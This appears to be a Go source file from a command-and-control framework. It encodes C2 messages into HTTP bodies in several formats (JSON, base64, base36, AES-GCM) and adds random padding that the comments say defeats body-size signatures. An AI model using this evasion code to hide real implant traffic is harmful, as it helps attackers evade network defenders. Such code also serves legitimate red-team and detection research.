// Package main implements the body codecs used by the malleable HTTP transport.
//
// A codec turns a protocol string (the same "CHK|...", "POLL|...", "RESULT|..."
// messages the DNS transport carries inside subdomain labels) into an HTTP body,
// and back. The codec is a wire-visible property chosen per listener profile, so
// the same C2 protocol can be dressed as JSON, base64, base36, AES-GCM or raw
// bytes without touching the protocol logic itself.
package main

import (
	"crypto/rand"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"math/big"
)

// encodeHTTPBody renders a protocol string as an HTTP body per the codec.
//
// key is the C2 encryption key, used only by the aes-gcm codecs. Padding is
// added for those codecs when the profile asks for it: it defeats a fixed-size
// body signature without shortening the message.
func encodeHTTPBody(c BodyCodec, plaintext string, key []byte) ([]byte, error) {
	switch c.Encoding {
	case codecRaw:
		return []byte(plaintext), nil
	}

	fields := make(map[string]string, 2)

	switch c.Encoding {
	case codecBase64:
		fields[c.Field] = base64.StdEncoding.EncodeToString([]byte(plaintext))

	case codecBase36:
		fields[c.Field] = base36EncodeString(plaintext)

	case codecAESGCMBase64:
		ciphertext, err := encryptAESGCM([]byte(plaintext), key)
		if err != nil {
			return nil, fmt.Errorf("failed to encrypt body: %w", err)
		}
		fields[c.Field] = base64.StdEncoding.EncodeToString(ciphertext)

	case codecAESGCMBase36:
		ciphertext, err := encryptAESGCM([]byte(plaintext), key)
		if err != nil {
			return nil, fmt.Errorf("failed to encrypt body: %w", err)
		}
		fields[c.Field] = base36Encode(ciphertext)

	default:
		return nil, fmt.Errorf("unsupported body encoding %q", c.Encoding)
	}

	// Random padding keeps body length off a fixed grid. Receivers ignore it.
	if c.PaddingFld != "" && c.PadMax > 0 {
		padding, err := randomPadding(c.PadMin, c.PadMax)
		if err != nil {
			return nil, err
		}
		fields[c.PaddingFld] = padding
	}

	encoded, err := json.Marshal(fields)
	if err != nil {
		return nil, fmt.Errorf("failed to marshal body: %w", err)
	}
	return encoded, nil
}

// decodeHTTPBody reverses encodeHTTPBody.
func decodeHTTPBody(c BodyCodec, body []byte, key []byte) (string, error) {
	if c.Encoding == codecRaw {
		return string(body), nil
	}

	// Decode into raw messages first so an unexpected field type cannot be
	// silently coerced into a string.
	var envelope map[string]json.RawMessage
	if err := json.Unmarshal(body, &envelope); err != nil {
		return "", fmt.Errorf("body is not a JSON object: %w", err)
	}

	raw, ok := envelope[c.Field]
	if !ok {
		return "", fmt.Errorf("body is missing field %q", c.Field)
	}

	var value string
	if err := json.Unmarshal(raw, &value); err != nil {
		return "", fmt.Errorf("field %q is not a string: %w", c.Field, err)
	}

	switch c.Encoding {
	case codecBase64:
		decoded, err := base64.StdEncoding.DecodeString(value)
		if err != nil {
			return "", fmt.Errorf("failed to base64-decode body: %w", err)
		}
		return string(decoded), nil

	case codecBase36:
		decoded, err := base36DecodeString(value)
		if err != nil {
			return "", fmt.Errorf("failed to base36-decode body: %w", err)
		}
		return string(decoded), nil

	case codecAESGCMBase64:
		ciphertext, err := base64.StdEncoding.DecodeString(value)
		if err != nil {
			return "", fmt.Errorf("failed to base64-decode body: %w", err)
		}
		plaintext, err := decryptAESGCM(ciphertext, key)
		if err != nil {
			return "", fmt.Errorf("failed to decrypt body: %w", err)
		}
		return string(plaintext), nil

	case codecAESGCMBase36:
		ciphertext, err := base36Decode(value)
		if err != nil {
			return "", fmt.Errorf("failed to base36-decode body: %w", err)
		}
		plaintext, err := decryptAESGCM(ciphertext, key)
		if err != nil {
			return "", fmt.Errorf("failed to decrypt body: %w", err)
		}
		return string(plaintext), nil
	}

	return "", fmt.Errorf("unsupported body encoding %q", c.Encoding)
}

// randomPadding returns a random alphanumeric string of length in [min, max].
// It uses crypto/rand rather than math/rand deliberately: a predictable padding
// length would be a stable signal across requests.
func randomPadding(minLength, maxLength int) (string, error) {
	if maxLength < minLength {
		minLength, maxLength = maxLength, minLength
	}
	if maxLength <= 0 {
		return "", nil
	}

	span := maxLength - minLength + 1
	offset, err := rand.Int(rand.Reader, big.NewInt(int64(span)))
	if err != nil {
		return "", fmt.Errorf("failed to pick padding length: %w", err)
	}
	length := minLength + int(offset.Int64())
	if length == 0 {
		return "", nil
	}

	const alphabet = "abcdefghijklmnopqrstuvwxyz0123456789"
	out := make([]byte, length)
	for i := range out {
		index, err := rand.Int(rand.Reader, big.NewInt(int64(len(alphabet))))
		if err != nil {
			return "", fmt.Errorf("failed to generate padding: %w", err)
		}
		out[i] = alphabet[index.Int64()]
	}
	return string(out), nil
}
